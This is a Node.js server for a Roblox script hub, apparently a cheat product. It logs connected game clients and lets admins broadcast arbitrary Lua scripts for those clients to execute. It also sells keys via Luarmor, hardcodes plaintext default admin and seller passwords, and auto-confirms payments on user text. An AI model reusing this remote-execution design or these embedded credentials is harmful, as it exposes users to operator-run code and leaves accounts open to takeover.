// Rolbox Command Server - Upgraded with MySQL, File Uploads & Luarmor Integration
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const mysql = require('mysql2/promise');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const multer = require('multer');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const CLIENT_TIMEOUT_MS = 15000;
const SNAPSHOT_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes

// --- SECURITY & CORE MIDDLEWARE ---
app.use(helmet());

const allowedOrigins = [
    'https://w1ckllon.com', // Your admin panel's domain
    'http://localhost:5500',
    'http://127.0.0.1:5500'
];
app.use(cors({
    origin: function(origin, callback) {
        if (!origin || allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    }
}));

app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// --- FILE UPLOAD & STATIC SERVING ---
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}
app.use('/uploads', express.static('uploads'));

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({
    storage: storage,
    limits: { fileSize: 5 * 1024 * 1024 }, // 5 MB limit
    fileFilter: (req, file, cb) => {
        if (file.mimetype === "image/png") {
            cb(null, true);
        } else {
            cb(new Error("Only .png files are allowed!"), false);
        }
    }
});

// In-memory stores for connected game clients
let clients = new Map();
let pendingCommands = new Map();

// --- MYSQL DATABASE SETUP ---
const dbPool = mysql.createPool({
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_DATABASE,
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
});

// --- DATABASE INITIALIZATION ---
async function initializeDatabase() {
    try {
        const connection = await dbPool.getConnection();
        console.log("Successfully connected to MySQL database.");

        await connection.query(`CREATE TABLE IF NOT EXISTS connections (
            id INT AUTO_INCREMENT PRIMARY KEY, 
            client_id VARCHAR(255) NOT NULL, 
            username VARCHAR(255) NOT NULL, 
            user_id BIGINT, 
            game_name VARCHAR(255), 
            server_info VARCHAR(255), 
            player_count INT, 
            connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );`);
        
        await connection.query(`CREATE TABLE IF NOT EXISTS commands (
            id INT AUTO_INCREMENT PRIMARY KEY, 
            command_type VARCHAR(50) NOT NULL, 
            content TEXT, 
            executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );`);
        
        await connection.query(`CREATE TABLE IF NOT EXISTS player_snapshots (
            id INT AUTO_INCREMENT PRIMARY KEY, 
            player_count INT NOT NULL, 
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );`);
        
        await connection.query(`CREATE TABLE IF NOT EXISTS adminusers (
            id INT AUTO_INCREMENT PRIMARY KEY, 
            username VARCHAR(255) UNIQUE NOT NULL, 
            password_hash VARCHAR(255) NOT NULL, 
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );`);
        
        await connection.query(`CREATE TABLE IF NOT EXISTS key_redemptions (
            id INT AUTO_INCREMENT PRIMARY KEY, 
            redeemed_by_admin VARCHAR(255) NOT NULL, 
            discord_user_id VARCHAR(255) NOT NULL, 
            generated_key VARCHAR(255) NOT NULL, 
            screenshot_filename VARCHAR(255), 
            redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );`);

        // Create tickets table
        await connection.query(`CREATE TABLE IF NOT EXISTS tickets (
            id INT AUTO_INCREMENT PRIMARY KEY,
            user_id INT NOT NULL,
            status ENUM('awaiting', 'processing', 'completed') DEFAULT 'awaiting',
            license_key VARCHAR(255),
            payment_method VARCHAR(50),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES adminusers(id)
        );`);

        // Create ticket_messages table
        await connection.query(`CREATE TABLE IF NOT EXISTS ticket_messages (
            id INT AUTO_INCREMENT PRIMARY KEY,
            ticket_id INT NOT NULL,
            sender ENUM('user', 'seller') NOT NULL,
            message TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (ticket_id) REFERENCES tickets(id) ON DELETE CASCADE
        );`);

        const [adminUsers] = await connection.query("SELECT COUNT(*) as count FROM adminusers");
        if (adminUsers[0].count === 0) {
            console.log("Creating default admin users...");
            const hashedVupxy = await bcrypt.hash('vupxydev', 10);
            const hashedMegamind = await bcrypt.hash('megaminddev', 10);
            await connection.query("INSERT INTO adminusers (username, password_hash) VALUES (?, ?), (?, ?)", ['vupxy', hashedVupxy, 'megamind', hashedMegamind]);
        }

        // --- NEW: Section to create/ensure seller users exist ---
        const sellerUsers = [
            { username: 'Vandelz', password: 'Vandelzseller1' },
            { username: 'zuse35', password: 'zuse35seller1' },
            { username: 'Duzin', password: 'Duzinseller1' },
            { username: 'swiftkey', password: 'swiftkeyseller1' }
        ];

        for (const user of sellerUsers) {
            const [existingUser] = await connection.query("SELECT COUNT(*) as count FROM adminusers WHERE username = ?", [user.username]);
            if (existingUser[0].count === 0) {
                console.log(`Creating seller user: ${user.username}...`);
                const hashedPassword = await bcrypt.hash(user.password, 10);
                await connection.query("INSERT INTO adminusers (username, password_hash) VALUES (?, ?)", [user.username, hashedPassword]);
                console.log(`User ${user.username} created.`);
            }
        }
        // --- End of new section ---

        connection.release();
        console.log("Database initialization complete.");
    } catch (error) {
        console.error("!!! DATABASE INITIALIZATION FAILED !!!", error);
        process.exit(1);
    }
}

// --- AUTHENTICATION MIDDLEWARE ---
const verifyToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ message: 'Unauthorized: No token provided' });

    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ message: 'Forbidden: Invalid token' });
        req.user = user;
        next();
    });
};

// --- AUTHENTICATION ENDPOINTS ---
const loginLimiter = rateLimit({ 
    windowMs: 15 * 60 * 1000, 
    max: 10, 
    message: 'Too many login attempts.' 
});

app.post('/login', loginLimiter, async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password || !process.env.JWT_SECRET) 
        return res.status(400).json({ message: 'Invalid request or server config error.' });

    try {
        const [rows] = await dbPool.query("SELECT * FROM adminusers WHERE username = ?", [username]);
        if (rows.length === 0) return res.status(401).json({ message: 'Invalid credentials' });

        const user = rows[0];
        const isMatch = await bcrypt.compare(password, user.password_hash);
        if (!isMatch) return res.status(401).json({ message: 'Invalid credentials' });

        const payload = { id: user.id, username: user.username };
        const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '8h' });
        res.json({ success: true, token, username: user.username });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// --- TICKET ENDPOINTS ---
app.get('/api/tickets', verifyToken, async (req, res) => {
    try {
        const [tickets] = await dbPool.query(
            `SELECT t.*, u.username as seller_name 
             FROM tickets t 
             JOIN adminusers u ON t.user_id = u.id 
             WHERE t.user_id = ? 
             ORDER BY t.created_at DESC`,
            [req.user.id]
        );
        
        // Add messages to each ticket
        for (let ticket of tickets) {
            const [messages] = await dbPool.query(
                "SELECT * FROM ticket_messages WHERE ticket_id = ? ORDER BY created_at ASC",
                [ticket.id]
            );
            ticket.messages = messages;
        }
        
        res.json(tickets);
    } catch (error) {
        console.error('Error fetching tickets:', error);
        res.status(500).json({ message: 'Failed to fetch tickets' });
    }
});

app.post('/api/tickets', verifyToken, async (req, res) => {
    const { paymentMethod } = req.body;
    
    if (!paymentMethod) {
        return res.status(400).json({ message: 'Payment method is required' });
    }
    
    try {
        // Generate license key
        const licenseKey = generateLicenseKey();
        
        // Create ticket
        const [result] = await dbPool.query(
            "INSERT INTO tickets (user_id, license_key, payment_method) VALUES (?, ?, ?)",
            [req.user.id, licenseKey, paymentMethod]
        );
        
        const ticketId = result.insertId;
        
        // Create initial message
        await dbPool.query(
            "INSERT INTO ticket_messages (ticket_id, sender, message) VALUES (?, ?, ?)",
            [ticketId, 'seller', `Welcome! I can help you purchase Eps1llon Hub Premium for $10 using ${paymentMethod}. Please send $10.00 and reply with 'payment sent' once completed.`]
        );
        
        // Fetch the created ticket
        const [tickets] = await dbPool.query(
            `SELECT t.*, u.username as seller_name 
             FROM tickets t 
             JOIN adminusers u ON t.user_id = u.id 
             WHERE t.id = ?`,
            [ticketId]
        );
        
        const [messages] = await dbPool.query(
            "SELECT * FROM ticket_messages WHERE ticket_id = ? ORDER BY created_at ASC",
            [ticketId]
        );
        
        const ticket = tickets[0];
        ticket.messages = messages;
        
        res.json(ticket);
    } catch (error) {
        console.error('Error creating ticket:', error);
        res.status(500).json({ message: 'Failed to create ticket' });
    }
});

app.post('/api/tickets/:id/messages', verifyToken, async (req, res) => {
    const { id } = req.params;
    const { message } = req.body;
    
    if (!message) {
        return res.status(400).json({ message: 'Message is required' });
    }
    
    try {
        // Verify ticket belongs to user
        const [tickets] = await dbPool.query(
            "SELECT * FROM tickets WHERE id = ? AND user_id = ?",
            [id, req.user.id]
        );
        
        if (tickets.length === 0) {
            return res.status(404).json({ message: 'Ticket not found' });
        }
        
        const ticket = tickets[0];
        
        // Add user message
        await dbPool.query(
            "INSERT INTO ticket_messages (ticket_id, sender, message) VALUES (?, ?, ?)",
            [id, 'user', message]
        );
        
        // Update ticket status if needed
        if (message.toLowerCase().includes('payment sent') && ticket.status === 'processing') {
            await dbPool.query(
                "UPDATE tickets SET status = 'completed' WHERE id = ?",
                [id]
            );
            
            // Add confirmation message after delay
            setTimeout(async () => {
                await dbPool.query(
                    "INSERT INTO ticket_messages (ticket_id, sender, message) VALUES (?, ?, ?)",
                    [id, 'seller', "Payment confirmed! Your license is now active."]
                );
            }, 2500);
        }
        
        // Fetch updated ticket
        const [updatedTickets] = await dbPool.query(
            `SELECT t.*, u.username as seller_name 
             FROM tickets t 
             JOIN adminusers u ON t.user_id = u.id 
             WHERE t.id = ?`,
            [id]
        );
        
        const [messages] = await dbPool.query(
            "SELECT * FROM ticket_messages WHERE ticket_id = ? ORDER BY created_at ASC",
            [id]
        );
        
        const updatedTicket = updatedTickets[0];
        updatedTicket.messages = messages;
        
        res.json(updatedTicket);
    } catch (error) {
        console.error('Error adding message:', error);
        res.status(500).json({ message: 'Failed to add message' });
    }
});

// --- GAME CLIENT ENDPOINTS ---
app.post('/connect', async (req, res) => {
    const { id, username, gameName, serverInfo, playerCount, userId } = req.body;
    if (!id || !username) return res.status(400).json({ error: "Missing required fields." });
    
    clients.set(id, { 
        id, 
        username, 
        gameName, 
        serverInfo, 
        playerCount, 
        userId, 
        connectedAt: new Date(), 
        lastSeen: Date.now() 
    });
    
    if (!pendingCommands.has(id)) pendingCommands.set(id, []);

    console.log(`[CONNECT] Client registered: ${username} (ID: ${id})`);
    try {
        await dbPool.query(
            "INSERT INTO connections (client_id, username, user_id, game_name, server_info, player_count) VALUES (?, ?, ?, ?, ?, ?)", 
            [id, username, userId, gameName, serverInfo, playerCount]
        );
    } catch (error) {
        console.error(`[DB] Failed to log connection for ${username}:`, error.message);
    }
    res.json({ message: "Successfully registered." });
});

app.post('/poll', (req, res) => {
    const { id } = req.body;
    if (!id || !clients.has(id)) return res.status(404).json({ error: "Client not registered." });
    
    clients.get(id).lastSeen = Date.now();
    const commands = pendingCommands.get(id) || [];
    pendingCommands.set(id, []);
    res.json({ commands });
});

// --- PROTECTED ADMIN ENDPOINTS ---
app.get('/api/clients', verifyToken, (req, res) => {
    res.json({ count: clients.size, clients: Array.from(clients.values()) });
});

app.post('/broadcast', verifyToken, async (req, res) => {
    const { command } = req.body;
    if (!command) return res.status(400).json({ error: 'Missing "command"' });
    
    const commandObj = { type: "execute", payload: command };
    let successCount = 0;
    clients.forEach((c, id) => {
        pendingCommands.get(id)?.push(commandObj);
        successCount++;
    });

    try {
        const commandType = typeof command === "string" ? "lua_script" : "json_action";
        await dbPool.query("INSERT INTO commands (command_type, content) VALUES (?, ?)", [commandType, JSON.stringify(command)]);
    } catch (error) { 
        console.error("[DB] Failed to log broadcast command:", error.message); 
    }
    
    res.json({ message: `Command broadcasted to ${successCount}/${clients.size} clients.` });
});

app.post('/api/command/targeted', verifyToken, (req, res) => {
    const { clientIds, command } = req.body;
    if (!Array.isArray(clientIds) || !command) 
        return res.status(400).json({ error: 'Missing "clientIds" array or "command".' });
    
    const commandObj = { type: "execute", payload: command };
    let successCount = 0;
    clientIds.forEach(id => {
        if (clients.has(id) && pendingCommands.has(id)) {
            pendingCommands.get(id).push(commandObj);
            successCount++;
        }
    });

    res.json({ message: `Command sent to ${successCount}/${clientIds.length} selected clients.` });
});

app.post('/kick', verifyToken, (req, res) => {
    const { clientId } = req.body;
    const client = clients.get(clientId);
    if (!client) return res.status(404).json({ error: "Client not found." });
    
    pendingCommands.get(clientId)?.push({ type: "kick" });
    setTimeout(() => {
        clients.delete(clientId);
        pendingCommands.delete(clientId);
    }, 5000);
    
    res.json({ message: `Client ${client.username} kicked.` });
});

app.post('/api/seller/redeem', verifyToken, upload.single('screenshot'), async (req, res) => {
    const { discordUsername: discordUserId } = req.body;
    const adminUsername = req.user.username;
    
    if (!discordUserId) return res.status(400).json({ error: 'Discord User ID is required.' });
    if (!req.file) return res.status(400).json({ error: 'Screenshot file is required.' });
    if (!process.env.LUARMOR_API_KEY || !process.env.LUARMOR_PROJECT_ID) {
        return res.status(500).json({ error: "Luarmor API is not configured on the server." });
    }

    const url = `https://api.luarmor.net/v3/projects/${process.env.LUARMOR_PROJECT_ID}/users`;
    const headers = { 
        "Authorization": process.env.LUARMOR_API_KEY, 
        "Content-Type": "application/json" 
    };
    const payload = { 
        "discord_id": discordUserId, 
        "note": `Redeemed by ${adminUsername} on ${new Date().toLocaleDateString()}` 
    };

    try {
        const luarmorResponse = await axios.post(url, payload, { headers });
        const data = luarmorResponse.data;

        if (data.success && data.user_key) {
            const newKey = data.user_key;
            await dbPool.query(
                "INSERT INTO key_redemptions (redeemed_by_admin, discord_user_id, generated_key, screenshot_filename) VALUES (?, ?, ?, ?)",
                [adminUsername, discordUserId, newKey, req.file.filename]
            );
            res.json({ 
                success: true, 
                message: `Key successfully generated and linked to ${discordUserId}.`, 
                generatedKey: newKey 
            });
        } else {
            if (req.file) fs.unlinkSync(req.file.path);
            res.status(400).json({ 
                success: false, 
                error: `Luarmor API Error: ${data.message || 'Unknown error.'}` 
            });
        }
    } catch (error) {
        if (req.file) fs.unlinkSync(req.file.path);
        console.error("Luarmor API request failed:", error.response ? error.response.data : error.message);
        res.status(500).json({ error: 'An internal error occurred while communicating with the key service.' });
    }
});

// --- ANALYTICS & LOGS ENDPOINTS ---
async function getAggregatedData(tableName, dateColumn, valueColumn, period, aggregationFn = 'COUNT') {
    let interval, groupByFormat;
    switch (period) {
        case 'daily':
            interval = '24 HOUR';
            groupByFormat = '%Y-%m-%d %H:00:00';
            break;
        case 'weekly':
            interval = '7 DAY';
            groupByFormat = '%Y-%m-%d';
            break;
        case 'monthly':
        default:
            interval = '30 DAY';
            groupByFormat = '%Y-%m-%d';
            break;
    }

    const query = `
        SELECT DATE_FORMAT(${dateColumn}, ?) AS date, ${aggregationFn}(${valueColumn}) AS count
        FROM ${tableName}
        WHERE ${dateColumn} >= NOW() - INTERVAL ${interval}
        GROUP BY date ORDER BY date ASC;
    `;
    const [rows] = await dbPool.query(query, [groupByFormat]);
    return rows;
}

app.get('/api/executions', verifyToken, async (req, res) => {
    try {
        const data = await getAggregatedData('connections', 'connected_at', 'id', req.query.period, 'COUNT');
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: "Failed to retrieve connection statistics." });
    }
});

app.get('/api/player-stats', verifyToken, async (req, res) => {
    try {
        const data = await getAggregatedData('player_snapshots', 'created_at', 'player_count', req.query.period, 'MAX');
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to retrieve player statistics.' });
    }
});

app.get('/api/seller/keys-sold', verifyToken, async (req, res) => {
    try {
        const data = await getAggregatedData('key_redemptions', 'redeemed_at', 'id', req.query.period, 'COUNT');
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to retrieve key redemption statistics.' });
    }
});

app.get('/api/seller/sales-log', verifyToken, async (req, res) => {
    try {
        const [rows] = await dbPool.query("SELECT * FROM key_redemptions ORDER BY redeemed_at DESC");
        res.json(rows);
    } catch (error) {
        console.error("Failed to retrieve sales log:", error);
        res.status(500).json({ error: 'Failed to retrieve sales log.' });
    }
});

// --- UTILITY FUNCTIONS ---
function generateLicenseKey() {
    let key = 'EPS1LLON-';
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    for (let i = 0; i < 4; i++) {
        for (let j = 0; j < 4; j++) {
            key += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        if (i < 3) key += '-';
    }
    return key;
}

// --- UTILITY INTERVALS ---
setInterval(() => {
    const now = Date.now();
    clients.forEach((client, id) => {
        if (now - client.lastSeen > CLIENT_TIMEOUT_MS) {
            clients.delete(id);
            pendingCommands.delete(id);
            console.log(`[TIMEOUT] Kicked inactive client: ${client.username} (ID: ${id})`);
        }
    });
}, 5000);

setInterval(async () => {
    if (clients.size > 0) {
        try {
            await dbPool.query("INSERT INTO player_snapshots (player_count) VALUES (?)", [clients.size]);
        } catch (error) {
            console.error("[DB] Failed to log player snapshot:", error.message);
        }
    }
}, SNAPSHOT_INTERVAL_MS);

// --- START SERVER ---
async function startServer() {
    await initializeDatabase();
    app.listen(PORT, () => console.log(`Aperture Command Server running on port ${PORT}`));
}

startServer();
